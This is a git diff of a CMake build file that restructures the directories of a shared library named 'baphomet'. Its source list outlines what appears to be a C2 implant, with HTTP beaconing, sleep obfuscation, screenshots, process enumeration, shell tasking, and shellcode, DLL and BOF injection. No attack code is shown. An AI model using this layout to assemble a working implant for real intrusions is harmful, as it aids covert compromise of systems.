@@ -2,41 +2,48 @@ cmake_minimum_required(VERSION 3.28)
 project(baphomet)
 
 set(CMAKE_CXX_STANDARD 17)
+set(MAIN_INCLUDE_DIR ${CMAKE_CURRENT_SOURCE_DIR}/include)
 
-add_library(baphomet SHARED main.cpp
-        main.hpp
-        networking/http/send.cpp
-        util/structs.hpp
-        util/function_ptrs.hpp
-        util/common.hpp
-        networking/http/init.cpp
-        networking/http/recieve.cpp
-        obfuscation/sleep.cpp
-        obfuscation/sleep.hpp
-        tasking/basic/filesystem.cpp
-        tasking/basic/filesystem.hpp
-        util/io.cpp
-        util/io.hpp
-        tasking/basic/shell.cpp
-        tasking/basic/shell.hpp
-        reconaissance/screenshot.cpp
-        reconaissance/basic.cpp
-        reconaissance/procenum.cpp
-        tasking/injection/shellcode/shellcode.cpp
-        tasking/injection/exe/runexe.cpp
-        tasking/injection/injection.hpp
-        tasking/injection/dll/rundll.cpp
-        tasking/misc/basic.cpp
-        tasking/misc/memory.cpp
-        tasking/misc/misc.hpp
-        tasking/injection/bof/runbof.cpp
-        tasking/injection/bof/beacon_api.cpp
-        tasking/injection/bof/beacon_api.hpp
-        util/macro.hpp
-        networking/http/http.hpp
-        reconaissance/reconaissance.hpp
-        util/hash.cpp
-        dispatch.cpp
+add_library(baphomet SHARED src/main.cpp
+        src/networking/http/send.cpp
+        src/networking/http/init.cpp
+        src/networking/http/recieve.cpp
+
+        src/reconaissance/screenshot.cpp
+        src/reconaissance/basic.cpp
+        src/reconaissance/procenum.cpp
+
+        src/util/hash.cpp
+        src/util/dispatch.cpp
+        src/util/io.cpp
+        src/util/memory.cpp
+        src/util/basic.cpp
+
+        src/tasking/basic/filesystem.cpp
+        src/tasking/basic/shell.cpp
+        src/tasking/injection/runbof.cpp
+        src/tasking/injection/beacon_api.cpp
+        src/tasking/injection/shellcode.cpp
+        src/tasking/injection/runexe.cpp
+        src/tasking/injection/rundll.cpp
+
+        src/obfuscation/sleep.cpp
+
+        include/main.hpp
+        include/beacon_api.hpp
+        include/common.hpp
+        include/filesystem.hpp
+        include/function_ptrs.hpp
+        include/http.hpp
+        include/injection.hpp
+        include/io.hpp
+        include/macro.hpp
+        include/misc.hpp
+        include/reconaissance.hpp
+        include/shell.hpp
+        include/sleep.hpp
+        include/structs.hpp
 )
 
 target_compile_definitions(baphomet PRIVATE BAPHOMET_DEBUG)
+target_include_directories(baphomet PRIVATE ${MAIN_INCLUDE_DIR})
